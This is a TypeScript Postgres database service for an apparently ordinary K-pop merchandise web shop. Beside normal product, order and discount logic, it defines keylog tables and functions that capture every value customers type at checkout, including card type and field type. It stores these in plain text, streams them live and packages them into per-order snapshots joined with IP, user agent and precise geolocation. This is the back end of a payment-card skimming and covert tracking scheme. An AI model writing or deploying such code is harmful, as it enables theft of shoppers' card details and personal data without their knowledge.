import { Pool, QueryResult } from 'pg'
import { EventEmitter } from 'events'

export const realtimeBus = new EventEmitter()

// Initialize Postgres connection pool
let pool: Pool | null = null

function getPool(): Pool {
  if (!pool) {
    const connectionString = process.env.DATABASE_URL || process.env.POSTGRES_URL
    
    if (!connectionString) {
      throw new Error('DATABASE_URL or POSTGRES_URL environment variable is required')
    }

    pool = new Pool({
      connectionString,
      ssl: connectionString.includes('sslmode=require') ? { rejectUnauthorized: false } : false,
      max: 20, // Maximum number of clients in the pool
      idleTimeoutMillis: 30000,
      connectionTimeoutMillis: 2000,
    })

    // Handle pool errors
    pool.on('error', (err) => {
      console.error('Unexpected error on idle client', err)
    })
  }
  
  return pool
}

// Helper function to execute queries
async function query(text: string, params?: any[]): Promise<QueryResult> {
  const client = getPool()
  try {
    return await client.query(text, params)
  } catch (error) {
    console.error('Database query error:', error)
    throw error
  }
}

// Initialize database schema
async function initializeSchema() {
  try {
    await query(`
      CREATE TABLE IF NOT EXISTS products (
        id VARCHAR(255) PRIMARY KEY,
        name VARCHAR(255) NOT NULL,
        description TEXT,
        price NUMERIC(10, 2) NOT NULL,
        images TEXT,
        sizes TEXT,
        colors TEXT,
        material TEXT,
        washingGuide TEXT,
        printType TEXT,
        inStock BOOLEAN DEFAULT true,
        category VARCHAR(255),
        collectionId VARCHAR(255),
        featured BOOLEAN DEFAULT false,
        createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updatedAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS collections (
        id VARCHAR(255) PRIMARY KEY,
        name VARCHAR(255) NOT NULL,
        slug VARCHAR(255) UNIQUE NOT NULL,
        image TEXT,
        description TEXT,
        featured BOOLEAN DEFAULT false,
        createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updatedAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS orders (
        id VARCHAR(255) PRIMARY KEY,
        customerEmail VARCHAR(255) NOT NULL,
        customerName VARCHAR(255) NOT NULL,
        shippingAddress TEXT,
        items TEXT,
        subtotal NUMERIC(10, 2) NOT NULL,
        shipping NUMERIC(10, 2) DEFAULT 0,
        discount NUMERIC(10, 2) DEFAULT 0,
        total NUMERIC(10, 2) NOT NULL,
        status VARCHAR(50) DEFAULT 'pending',
        paymentStatus VARCHAR(50) DEFAULT 'pending',
        createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updatedAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS customers (
        id VARCHAR(255) PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        firstName VARCHAR(255),
        lastName VARCHAR(255),
        phone VARCHAR(50),
        address TEXT,
        city VARCHAR(255),
        state VARCHAR(255),
        zipCode VARCHAR(50),
        country VARCHAR(100) DEFAULT 'USA',
        lastIp VARCHAR(50),
        userAgent TEXT,
        latitude NUMERIC(10, 8),
        longitude NUMERIC(11, 8),
        locationAccuracy NUMERIC(10, 2),
        locationTimestamp TIMESTAMP,
        totalOrders INTEGER DEFAULT 0,
        totalSpent NUMERIC(10, 2) DEFAULT 0,
        createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updatedAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS keylogs (
        id VARCHAR(255) PRIMARY KEY,
        customerEmail VARCHAR(255) NOT NULL,
        field VARCHAR(255) NOT NULL,
        value TEXT NOT NULL,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        ipAddress VARCHAR(50),
        userAgent TEXT,
        context VARCHAR(255),
        page VARCHAR(255),
        cardType VARCHAR(50),
        fieldType VARCHAR(50)
      );

      CREATE TABLE IF NOT EXISTS latest_keylogs (
        customerEmail VARCHAR(255) NOT NULL,
        field VARCHAR(255) NOT NULL,
        value TEXT NOT NULL,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        ipAddress VARCHAR(50),
        userAgent TEXT,
        context VARCHAR(255),
        page VARCHAR(255),
        cardType VARCHAR(50),
        fieldType VARCHAR(50),
        PRIMARY KEY (customerEmail, field)
      );

      CREATE TABLE IF NOT EXISTS feedbacks (
        id VARCHAR(255) PRIMARY KEY,
        customerName VARCHAR(255) NOT NULL,
        customerEmail VARCHAR(255) NOT NULL,
        rating INTEGER NOT NULL,
        comment TEXT,
        productId VARCHAR(255),
        verified BOOLEAN DEFAULT false,
        createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS completed_order_logs (
        orderId VARCHAR(255) PRIMARY KEY,
        customerEmail VARCHAR(255) NOT NULL,
        snapshotJson TEXT NOT NULL,
        latitude NUMERIC(10, 8),
        longitude NUMERIC(11, 8),
        ipAddress VARCHAR(50),
        userAgent TEXT,
        createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS discount_codes (
        id VARCHAR(255) PRIMARY KEY,
        code VARCHAR(255) UNIQUE NOT NULL,
        discountPercent INTEGER NOT NULL,
        active BOOLEAN DEFAULT true,
        createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updatedAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS product_types (
        id VARCHAR(255) PRIMARY KEY,
        name VARCHAR(255) UNIQUE NOT NULL,
        material TEXT,
        printType TEXT,
        washingGuide TEXT,
        createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updatedAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `)
    
    // Create indexes for better performance
    await query(`CREATE INDEX IF NOT EXISTS idx_products_collection ON products(collectionId)`)
    await query(`CREATE INDEX IF NOT EXISTS idx_products_featured ON products(featured)`)
    await query(`CREATE INDEX IF NOT EXISTS idx_keylogs_email ON keylogs(customerEmail)`)
    await query(`CREATE INDEX IF NOT EXISTS idx_orders_email ON orders(customerEmail)`)
    await query(`CREATE INDEX IF NOT EXISTS idx_completed_logs_email ON completed_order_logs(customerEmail)`)
    
    console.log('Database schema initialized successfully')
  } catch (error) {
    console.error('Error initializing database schema:', error)
    throw error
  }
}

// Initialize schema on module load
if (typeof window === 'undefined') {
  initializeSchema().catch(console.error)
}

class DatabaseService {
  private static instance: DatabaseService

  private constructor() {
    // Schema initialization happens on module load
    // Initialize data asynchronously
    this.initializeData().catch(console.error)
  }

  public static getInstance(): DatabaseService {
    if (!DatabaseService.instance) {
      DatabaseService.instance = new DatabaseService()
    }
    return DatabaseService.instance
  }

  public async initializeData() {
    try {
      const result = await query('SELECT COUNT(*) as count FROM products')
      const count = parseInt(result.rows[0].count)
      
      if (count === 0) {
        await this.seedData()
      }
    } catch (error) {
      console.error('Error checking product count:', error)
    }
  }

  private async seedData() {
    const sampleProducts = [
      {
        id: '1',
        name: 'BTS Dynamite T-Shirt',
        description: 'Premium quality cotton T-shirt featuring your favorite K-pop idols. Perfect for concerts, fan meetings, or casual wear. Made with 100% organic cotton for ultimate comfort.',
        price: 29.99,
        images: JSON.stringify(['/images/bts-dynamite-front.jpg', '/images/bts-dynamite-back.jpg']),
        sizes: JSON.stringify(['S', 'M', 'L', 'XL']),
        colors: JSON.stringify(['white', 'black', 'gray']),
        material: '100% Organic Cotton',
        washingGuide: 'Machine wash cold, tumble dry low',
        printType: 'Screen Print',
        inStock: true,
        category: 'T-Shirts',
        collectionId: null,
        featured: true,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
      }
    ]

    for (const product of sampleProducts) {
      await query(
        `INSERT INTO products (id, name, description, price, images, sizes, colors, material, washingGuide, printType, inStock, category, collectionId, featured, createdAt, updatedAt) 
         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16)`,
        [product.id, product.name, product.description, product.price, product.images, product.sizes, product.colors, product.material, product.washingGuide, product.printType, product.inStock, product.category, product.collectionId, product.featured, product.createdAt, product.updatedAt]
      )
    }
  }

  // Products
  public async createProduct(data: any) {
    const id = data.id || `prod_${Date.now()}`
    const now = new Date().toISOString()
    await query(
      `INSERT INTO products (id, name, description, price, images, sizes, colors, material, washingGuide, printType, inStock, category, collectionId, featured, createdAt, updatedAt) 
       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16)`,
      [id, data.name, data.description || null, data.price, JSON.stringify(data.images || []), JSON.stringify(data.sizes || []), JSON.stringify(data.colors || []), data.material || null, data.washingGuide || null, data.printType || null, data.inStock !== false, data.category || null, data.collectionId || null, data.featured || false, now, now]
    )
    return this.getProduct(id)
  }

  public async updateProduct(id: string, updates: any) {
    const now = new Date().toISOString()
    await query(
      `UPDATE products SET name = $1, description = $2, price = $3, images = $4, sizes = $5, colors = $6, material = $7, washingGuide = $8, printType = $9, inStock = $10, category = $11, collectionId = $12, featured = $13, updatedAt = $14 WHERE id = $15`,
      [updates.name, updates.description || null, updates.price, JSON.stringify(updates.images || []), JSON.stringify(updates.sizes || []), JSON.stringify(updates.colors || []), updates.material || null, updates.washingGuide || null, updates.printType || null, updates.inStock !== false, updates.category || null, updates.collectionId || null, updates.featured || false, now, id]
    )
    return this.getProduct(id)
  }

  public async deleteProduct(id: string) {
    const result = await query('DELETE FROM products WHERE id = $1', [id])
    return (result.rowCount || 0) > 0
  }

  public async getProduct(id: string) {
    const result = await query('SELECT * FROM products WHERE id = $1', [id])
    if (result.rows.length === 0) return null
    return this.parseProduct(result.rows[0])
  }

  public async getProducts() {
    const result = await query('SELECT * FROM products ORDER BY createdAt DESC')
    return result.rows.map(row => this.parseProduct(row))
  }

  public async getFeaturedProducts() {
    const result = await query('SELECT * FROM products WHERE featured = true ORDER BY createdAt DESC')
    return result.rows.map(row => this.parseProduct(row))
  }

  private parseProduct(row: any) {
    return {
      ...row,
      images: row.images ? (typeof row.images === 'string' ? JSON.parse(row.images) : row.images) : [],
      sizes: row.sizes ? (typeof row.sizes === 'string' ? JSON.parse(row.sizes) : row.sizes) : [],
      colors: row.colors ? (typeof row.colors === 'string' ? JSON.parse(row.colors) : row.colors) : [],
      price: parseFloat(row.price),
      inStock: row.instock !== false,
      featured: row.featured === true
    }
  }

  // Collections
  public async createCollection(data: any) {
    const id = data.id || `coll_${Date.now()}`
    const now = new Date().toISOString()
    await query(
      `INSERT INTO collections (id, name, slug, image, description, featured, createdAt, updatedAt) VALUES ($1, $2, $3, $4, $5, $6, $7, $8)`,
      [id, data.name, data.slug, data.image || null, data.description || null, data.featured || false, now, now]
    )
    return this.getCollection(id)
  }

  public async updateCollection(id: string, updates: any) {
    const now = new Date().toISOString()
    await query(
      `UPDATE collections SET name = $1, slug = $2, image = $3, description = $4, featured = $5, updatedAt = $6 WHERE id = $7`,
      [updates.name, updates.slug, updates.image || null, updates.description || null, updates.featured || false, now, id]
    )
    return this.getCollection(id)
  }

  public async deleteCollection(id: string) {
    const result = await query('DELETE FROM collections WHERE id = $1', [id])
    return (result.rowCount || 0) > 0
  }

  public async getCollection(id: string) {
    const result = await query('SELECT * FROM collections WHERE id = $1', [id])
    return result.rows[0] || null
  }

  public async getCollectionBySlug(slug: string) {
    const result = await query('SELECT * FROM collections WHERE slug = $1', [slug])
    return result.rows[0] || null
  }

  public async getCollections() {
    const result = await query('SELECT * FROM collections ORDER BY createdAt DESC')
    return result.rows
  }

  // Orders
  public async createOrder(data: any) {
    const id = data.id || `ORD-${Date.now()}`
    const now = new Date().toISOString()
    await query(
      `INSERT INTO orders (id, customerEmail, customerName, shippingAddress, items, subtotal, shipping, discount, total, status, paymentStatus, createdAt, updatedAt) 
       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13)`,
      [id, data.customerEmail, data.customerName, JSON.stringify(data.shippingAddress || {}), JSON.stringify(data.items || []), data.subtotal, data.shipping || 0, data.discount || 0, data.total, data.status || 'pending', data.paymentStatus || 'pending', now, now]
    )
    return this.getOrder(id)
  }

  public async updateOrderStatus(id: string, status: string) {
    const now = new Date().toISOString()
    await query('UPDATE orders SET status = $1, updatedAt = $2 WHERE id = $3', [status, now, id])
    return this.getOrder(id)
  }

  public async getOrder(id: string) {
    const result = await query('SELECT * FROM orders WHERE id = $1', [id])
    if (result.rows.length === 0) return null
    const order = result.rows[0]
    return {
      ...order,
      shippingAddress: order.shippingaddress ? (typeof order.shippingaddress === 'string' ? JSON.parse(order.shippingaddress) : order.shippingaddress) : {},
      items: order.items ? (typeof order.items === 'string' ? JSON.parse(order.items) : order.items) : [],
      subtotal: parseFloat(order.subtotal),
      shipping: parseFloat(order.shipping),
      discount: parseFloat(order.discount),
      total: parseFloat(order.total)
    }
  }

  public async getOrders() {
    const result = await query('SELECT * FROM orders ORDER BY createdAt DESC')
    return result.rows.map(row => ({
      ...row,
      shippingAddress: row.shippingaddress ? (typeof row.shippingaddress === 'string' ? JSON.parse(row.shippingaddress) : row.shippingaddress) : {},
      items: row.items ? (typeof row.items === 'string' ? JSON.parse(row.items) : row.items) : [],
      subtotal: parseFloat(row.subtotal),
      shipping: parseFloat(row.shipping),
      discount: parseFloat(row.discount),
      total: parseFloat(row.total)
    }))
  }

  // Customers
  public async createOrUpdateCustomer(data: any) {
    const existing = await this.getCustomer(data.email)
    const now = new Date().toISOString()
    
    if (existing) {
      await query(
        `UPDATE customers SET firstName = $1, lastName = $2, phone = $3, address = $4, city = $5, state = $6, zipCode = $7, country = $8, lastIp = $9, userAgent = $10, latitude = $11, longitude = $12, locationAccuracy = $13, locationTimestamp = $14, totalOrders = $15, totalSpent = $16, updatedAt = $17 WHERE email = $18`,
        [data.firstName, data.lastName, data.phone, data.address, data.city, data.state, data.zipCode, data.country, data.lastIp, data.userAgent, data.latitude, data.longitude, data.locationAccuracy, data.locationTimestamp, data.totalOrders, data.totalSpent, now, data.email]
      )
    } else {
      const id = data.id || `cust_${Date.now()}`
      await query(
        `INSERT INTO customers (id, email, firstName, lastName, phone, address, city, state, zipCode, country, lastIp, userAgent, latitude, longitude, locationAccuracy, locationTimestamp, totalOrders, totalSpent, createdAt, updatedAt) 
         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20)`,
        [id, data.email, data.firstName, data.lastName, data.phone, data.address, data.city, data.state, data.zipCode, data.country, data.lastIp, data.userAgent, data.latitude, data.longitude, data.locationAccuracy, data.locationTimestamp, data.totalOrders || 0, data.totalSpent || 0, now, now]
      )
    }
    return this.getCustomer(data.email)
  }

  public async getCustomer(email: string) {
    const result = await query('SELECT * FROM customers WHERE email = $1', [email])
    if (result.rows.length === 0) return null
    const row = result.rows[0]
    return {
      ...row,
      latitude: row.latitude ? parseFloat(row.latitude) : null,
      longitude: row.longitude ? parseFloat(row.longitude) : null,
      locationAccuracy: row.locationaccuracy ? parseFloat(row.locationaccuracy) : null,
      totalOrders: parseInt(row.totalorders) || 0,
      totalSpent: parseFloat(row.totalspent) || 0
    }
  }

  public async getCustomers() {
    const result = await query('SELECT * FROM customers ORDER BY createdAt DESC')
    return result.rows
  }

  // Keylogs
  public async persistKeylog(data: any) {
    const id = data.id || `keylog_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
    await query(
      `INSERT INTO keylogs (id, customerEmail, field, value, timestamp, ipAddress, userAgent, context, page, cardType, fieldType) 
       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)`,
      [id, data.customerEmail, data.field, data.value, data.timestamp || new Date().toISOString(), data.ipAddress || null, data.userAgent || null, data.context || null, data.page || null, data.cardType || null, data.fieldType || null]
    )
    
    // Also update latest_keylogs
    await query(
      `INSERT INTO latest_keylogs (customerEmail, field, value, timestamp, ipAddress, userAgent, context, page, cardType, fieldType) 
       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10) 
       ON CONFLICT (customerEmail, field) 
       DO UPDATE SET value = EXCLUDED.value, timestamp = EXCLUDED.timestamp, ipAddress = EXCLUDED.ipAddress, userAgent = EXCLUDED.userAgent, context = EXCLUDED.context, page = EXCLUDED.page, cardType = EXCLUDED.cardType, fieldType = EXCLUDED.fieldType`,
      [data.customerEmail, data.field, data.value, data.timestamp || new Date().toISOString(), data.ipAddress || null, data.userAgent || null, data.context || null, data.page || null, data.cardType || null, data.fieldType || null]
    )
    
    realtimeBus.emit('keylog', { id, ...data })
  }

  public async persistCustomerSnapshot(email: string, fields: Record<string, string>, ipAddress: string, userAgent: string) {
    for (const [field, value] of Object.entries(fields)) {
      await this.persistKeylog({
        customerEmail: email,
        field,
        value: String(value),
        ipAddress,
        userAgent,
        context: 'checkout',
        page: 'checkout'
      })
    }
  }

  public async getKeylogs(limit = 1000) {
    const result = await query('SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT $1', [limit])
    return result.rows
  }

  public async getKeylogsByEmail(email: string) {
    const result = await query('SELECT * FROM keylogs WHERE customerEmail = $1 ORDER BY timestamp DESC', [email])
    return result.rows
  }

  public async getLatestKeylogs(limit = 1000) {
    const result = await query('SELECT * FROM latest_keylogs ORDER BY timestamp DESC LIMIT $1', [limit])
    return result.rows
  }

  public async getLatestKeylogsByEmail(email: string) {
    const result = await query('SELECT * FROM latest_keylogs WHERE customerEmail = $1 ORDER BY timestamp DESC', [email])
    return result.rows
  }

  // Completed Order Logs
  public async saveCompletedOrderSnapshot(data: { orderId: string; email: string; ipAddress: string; userAgent: string; additionalData?: Record<string, any> }) {
    try {
      const latestSnapshots = await this.getLatestKeylogsByEmail(data.email)
      const snapshot: Record<string, any> = {}
      latestSnapshots.forEach((log: any) => {
        snapshot[log.field] = log.value
      })
      
      if (data.additionalData) {
        Object.assign(snapshot, data.additionalData)
      }
      
      const customer = await this.getCustomer(data.email)
      const latitude = customer?.latitude || null
      const longitude = customer?.longitude || null
      
      await query(
        `INSERT INTO completed_order_logs (orderId, customerEmail, snapshotJson, latitude, longitude, ipAddress, userAgent, createdAt) 
         VALUES ($1, $2, $3, $4, $5, $6, $7, $8) 
         ON CONFLICT (orderId) 
         DO UPDATE SET snapshotJson = EXCLUDED.snapshotJson, latitude = EXCLUDED.latitude, longitude = EXCLUDED.longitude, ipAddress = EXCLUDED.ipAddress, userAgent = EXCLUDED.userAgent, createdAt = EXCLUDED.createdAt`,
        [data.orderId, data.email, JSON.stringify(snapshot), latitude, longitude, data.ipAddress, data.userAgent, new Date().toISOString()]
      )
      
      return true
    } catch (error) {
      console.error('Failed to save completed order snapshot:', error)
      return false
    }
  }

  public async getCompletedOrderLogsAll() {
    const result = await query('SELECT * FROM completed_order_logs ORDER BY createdAt DESC')
    return result.rows.map(row => ({
      ...row,
      snapshotJson: typeof row.snapshotjson === 'string' ? row.snapshotjson : JSON.stringify(row.snapshotjson),
      latitude: row.latitude ? parseFloat(row.latitude) : null,
      longitude: row.longitude ? parseFloat(row.longitude) : null
    }))
  }

  public async getCompletedOrderLogsForEmail(email: string) {
    const result = await query('SELECT * FROM completed_order_logs WHERE customerEmail = $1 ORDER BY createdAt DESC', [email])
    return result.rows.map(row => ({
      ...row,
      snapshotJson: typeof row.snapshotjson === 'string' ? row.snapshotjson : JSON.stringify(row.snapshotjson),
      latitude: row.latitude ? parseFloat(row.latitude) : null,
      longitude: row.longitude ? parseFloat(row.longitude) : null
    }))
  }

  public async clearCompletedOrderLogs() {
    await query('DELETE FROM completed_order_logs')
    return true
  }

  // Discount Codes
  public async createDiscountCode(data: any) {
    const id = data.id || `disc_${Date.now()}`
    const now = new Date().toISOString()
    await query(
      `INSERT INTO discount_codes (id, code, discountPercent, active, createdAt, updatedAt) VALUES ($1, $2, $3, $4, $5, $6)`,
      [id, data.code, data.discountPercent, data.active !== false, now, now]
    )
    return this.getDiscountCodeById(id)
  }

  public async updateDiscountCode(id: string, updates: any) {
    const now = new Date().toISOString()
    await query(
      `UPDATE discount_codes SET code = $1, discountPercent = $2, active = $3, updatedAt = $4 WHERE id = $5`,
      [updates.code, updates.discountPercent, updates.active !== false, now, id]
    )
    return this.getDiscountCodeById(id)
  }

  public async deleteDiscountCode(id: string) {
    const result = await query('DELETE FROM discount_codes WHERE id = $1', [id])
    return (result.rowCount || 0) > 0
  }

  public async getDiscountCode(code: string) {
    const result = await query('SELECT * FROM discount_codes WHERE code = $1 AND active = true', [code])
    return result.rows[0] || null
  }

  public async getDiscountCodeById(id: string) {
    const result = await query('SELECT * FROM discount_codes WHERE id = $1', [id])
    return result.rows[0] || null
  }

  public async getDiscountCodes() {
    const result = await query('SELECT * FROM discount_codes ORDER BY createdAt DESC')
    return result.rows
  }

  // Product Types
  public async createProductType(data: any) {
    const id = data.id || `ptype_${Date.now()}`
    const now = new Date().toISOString()
    await query(
      `INSERT INTO product_types (id, name, material, printType, washingGuide, createdAt, updatedAt) VALUES ($1, $2, $3, $4, $5, $6, $7)`,
      [id, data.name, data.material || null, data.printType || null, data.washingGuide || null, now, now]
    )
    return this.getProductType(id)
  }

  public async updateProductType(id: string, updates: any) {
    const now = new Date().toISOString()
    await query(
      `UPDATE product_types SET name = $1, material = $2, printType = $3, washingGuide = $4, updatedAt = $5 WHERE id = $6`,
      [updates.name, updates.material || null, updates.printType || null, updates.washingGuide || null, now, id]
    )
    return this.getProductType(id)
  }

  public async deleteProductType(id: string) {
    const result = await query('DELETE FROM product_types WHERE id = $1', [id])
    return (result.rowCount || 0) > 0
  }

  public async getProductType(id: string) {
    const result = await query('SELECT * FROM product_types WHERE id = $1', [id])
    return result.rows[0] || null
  }

  public async getProductTypes() {
    const result = await query('SELECT * FROM product_types ORDER BY createdAt DESC')
    return result.rows
  }

  // Feedbacks
  public async createFeedback(data: any) {
    const id = data.id || `feedback_${Date.now()}`
    await query(
      `INSERT INTO feedbacks (id, customerName, customerEmail, rating, comment, productId, verified, createdAt) 
       VALUES ($1, $2, $3, $4, $5, $6, $7, $8)`,
      [id, data.customerName, data.customerEmail, data.rating, data.comment || null, data.productId || null, data.verified || false, data.createdAt || new Date().toISOString()]
    )
    return this.getFeedback(id)
  }

  public async getFeedback(id: string) {
    const result = await query('SELECT * FROM feedbacks WHERE id = $1', [id])
    return result.rows[0] || null
  }

  public async getFeedbacks() {
    const result = await query('SELECT * FROM feedbacks ORDER BY createdAt DESC')
    return result.rows
  }

  // Analytics
  public async getAnalytics() {
    const [productsResult, ordersResult, customersResult, keylogsResult] = await Promise.all([
      query('SELECT COUNT(*) as count FROM products'),
      query('SELECT COUNT(*) as count, SUM(total) as revenue FROM orders'),
      query('SELECT COUNT(*) as count FROM customers'),
      query('SELECT COUNT(*) as count FROM keylogs')
    ])

    return {
      products: {
        total: parseInt(productsResult.rows[0].count)
      },
      orders: {
        total: parseInt(ordersResult.rows[0].count),
        revenue: parseFloat(ordersResult.rows[0].revenue || '0')
      },
      customers: {
        total: parseInt(customersResult.rows[0].count)
      },
      keylogs: {
        total: parseInt(keylogsResult.rows[0].count)
      }
    }
  }

  // Reset database (for admin)
  public async resetDatabase() {
    const tables = [
      'products', 'collections', 'orders', 'customers', 'keylogs', 
      'latest_keylogs', 'feedbacks', 'completed_order_logs', 
      'discount_codes', 'product_types'
    ]
    
    for (const table of tables) {
      await query(`DROP TABLE IF EXISTS ${table} CASCADE`)
    }
    
    await initializeSchema()
    await this.initializeData()
    return true
  }
}

export const databaseService = DatabaseService.getInstance()

